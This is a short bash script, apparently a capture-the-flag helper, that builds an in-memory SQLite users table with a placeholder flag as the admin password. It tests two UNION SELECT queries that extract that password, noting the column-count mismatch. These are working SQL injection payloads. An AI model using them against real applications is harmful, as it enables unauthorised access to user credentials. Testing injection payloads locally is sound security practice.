#!/bin/bash
sqlite3 :memory: << 'SQL'
CREATE TABLE users (
  user_id INTEGER PRIMARY KEY,
  user_name TEXT NOT NULL,
  user_privileges INTEGER NOT NULL,
  user_password TEXT NOT NULL
);

INSERT INTO users VALUES(0, 'admin', 0, 'FLAG{test_flag}');
INSERT INTO users VALUES(1, 'user_1', 1, 'pass1');
INSERT INTO users VALUES(2, 'user_2', 1, 'pass2');

-- Test query 1: SELECT * devuelve 4 columnas pero necesitamos 3
SELECT '=== Test 1: UNION SELECT * (4 columns vs 3) ===';
SELECT user_id, user_privileges, user_name FROM users WHERE (user_id in (1)) UNION SELECT * FROM users WHERE user_id=0;

-- Test query 2: Especificar solo 3 columnas
SELECT '=== Test 2: UNION SELECT 3 columns ===';
SELECT user_id, user_privileges, user_name FROM users WHERE (user_id in (1)) UNION SELECT user_id,user_privileges,user_password FROM users WHERE user_id=0;

SQL
